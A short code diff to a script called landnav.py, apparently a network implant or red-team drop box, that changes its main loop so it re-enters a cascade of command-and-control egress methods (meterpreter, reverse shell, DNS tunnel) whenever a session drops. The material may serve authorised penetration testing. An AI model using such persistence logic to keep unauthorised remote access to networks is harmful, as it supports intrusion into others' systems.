@@ -20,7 +20,7 @@ Usage:
     python3 landnav.py --status         # Print current state and exit
 """
 
-VERSION = "0.4.0"
+VERSION = "0.4.1"
 
 import argparse
 import datetime
@@ -784,16 +784,24 @@ def main():
             method = phase_c2_egress(net_config, cfg)
 
             if method:
-                # C2 connected — start watchdog and wait
-                log.info("C2 active — starting watchdog")
+                # For blocking methods (meterpreter/reverse_shell),
+                # _current_state is already FAILED by the time we get
+                # here — the session lived and died inside the call.
+                # Check immediately before starting the watchdog.
+                if egress._current_state == egress.EgressState.FAILED:
+                    log.warning("C2 session ended (%s) — re-entering cascade", method)
+                    led.set_state(led.C2_ATTEMPT)
+                    continue
+
+                # C2 is alive (dns_tunnel) — start watchdog and wait
+                log.info("C2 active via %s — starting watchdog", method)
                 egress.start_watchdog(cfg, on_reconnect=lambda m: led.set_state(led.C2_CONNECTED))
 
-                # Block until shutdown signal
+                # Block until shutdown or C2 failure
                 while not _shutdown:
                     time.sleep(5)
-                    # If C2 dropped and watchdog couldn't recover, re-enter cascade
                     if egress._current_state == egress.EgressState.FAILED:
-                        log.warning("Watchdog reports C2 failed — re-entering cascade")
+                        log.warning("C2 dropped (%s) — re-entering cascade", method)
                         led.set_state(led.C2_ATTEMPT)
                         break
 
